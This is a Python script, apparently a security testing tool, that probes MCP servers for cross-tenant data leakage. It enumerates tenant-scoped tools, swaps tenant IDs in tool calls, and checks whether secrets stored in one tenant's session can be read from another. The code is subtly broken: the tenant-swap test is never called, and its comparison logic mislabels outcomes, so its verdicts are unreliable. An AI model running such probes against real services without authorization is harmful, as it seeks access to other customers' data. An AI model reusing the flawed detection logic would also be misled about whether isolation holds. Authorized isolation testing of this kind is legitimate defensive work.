#!/usr/bin/env python3
"""
MCP Cross-Tenant Leakage Tester
Tests whether tenant isolation can be bypassed
"""
import requests
import json
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"

def test_tenant_isolation(target, tool_name, base_args, tenant_arg_name):
    """Test if manipulating tenant ID returns another tenant's data"""
    
    # Normal tenant
    normal_args = base_args.copy()
    normal_args[tenant_arg_name] = "tenant_a"
    normal_payload = {
        "jsonrpc": "2.0", "id": 1, "method": "tools/call",
        "params": {"name": tool_name, "arguments": normal_args}
    }
    
    # Try to access tenant_b's data
    leak_args = base_args.copy()
    leak_args[tenant_arg_name] = "tenant_b"
    leak_payload = {
        "jsonrpc": "2.0", "id": 2, "method": "tools/call",
        "params": {"name": tool_name, "arguments": leak_args}
    }
    
    try:
        r_normal = requests.post(f"{target}/mcp/call", json=normal_payload, timeout=10)
        r_leak = requests.post(f"{target}/mcp/call", json=leak_payload, timeout=10)
        
        normal_result = r_normal.json()
        leak_result = r_leak.json()
        
        # Check if we got different data
        if json.dumps(normal_result) != json.dumps(leak_result):
            return "ISOLATED"  # Normal behavior
        elif leak_result != normal_result:
            return "POSSIBLE_LEAK"
        else:
            return "SAME_DATA"
    except Exception as e:
        return f"ERROR: {e}"

def enumerate_tenant_tools(target):
    """Find tools that take tenant identifiers"""
    try:
        r = requests.get(f"{target}/.well-known/mcp.json", timeout=5)
        tools = r.json().get('tools', [])
    except:
        return []
    
    tenant_tools = []
    for tool in tools:
        tname = tool.get('name', '')
        tparams = json.dumps(tool.get('parameters', {}))
        # Look for tenant/org/user identifiers in parameters
        if any(x in tparams.lower() for x in ['tenant', 'org', 'organization', 'account', 'user_id']):
            tenant_tools.append(tool)
    
    return tenant_tools

def main():
    print(f"[*] MCP Cross-Tenant Leakage Tester")
    print(f"[*] Target: {TARGET}\n")
    
    tools = enumerate_tenant_tools(TARGET)
    
    if not tools:
        print("[-] No obvious tenant-scoped tools found via enumeration")
        print("[*] Manual check: look for tools with tenant_id, org, account in their parameters")
    else:
        print(f"[!] Found {len(tools)} tools with tenant/organization parameters")
        for t in tools:
            print(f"  - {t['name']}: {json.dumps(t.get('parameters', {}))[:200]}")

def test_context_bleeding(target):
    """Test if previous tenant's context bleeds into current session"""
    print("[*] Testing context bleeding between sessions...")
    try:
        sess_a = requests.post(f"{target}/mcp/session", json={
            "tenant": "tenant_a", "session_id": "a1b2c3"
        }, timeout=10).json()
        requests.post(f"{target}/mcp/call", json={
            "method": "tools/call",
            "params": {"name": "memory_store", "arguments": {"key": "secret_data", "value": "TENANT_A_SUPER_SECRET"}}
        }, headers={"Authorization": f"Bearer {sess_a.get('token', '')}"}, timeout=10)
        sess_b = requests.post(f"{target}/mcp/session", json={
            "tenant": "tenant_b", "session_id": "x1y2z3"
        }, timeout=10).json()
        result = requests.post(f"{target}/mcp/call", json={
            "method": "tools/call",
            "params": {"name": "memory_retrieve", "arguments": {"key": "secret_data"}}
        }, headers={"Authorization": f"Bearer {sess_b.get('token', '')}"}, timeout=10)
        response = result.json()
        if "TENANT_A_SUPER_SECRET" in json.dumps(response):
            print("[!] CONTEXT BLEEDING CONFIRMED: tenant_b can see tenant_a's data")
    except Exception as e:
        print(f"[*] Context bleeding test error: {e}")

if __name__ == "__main__":
    main()
    test_context_bleeding(TARGET)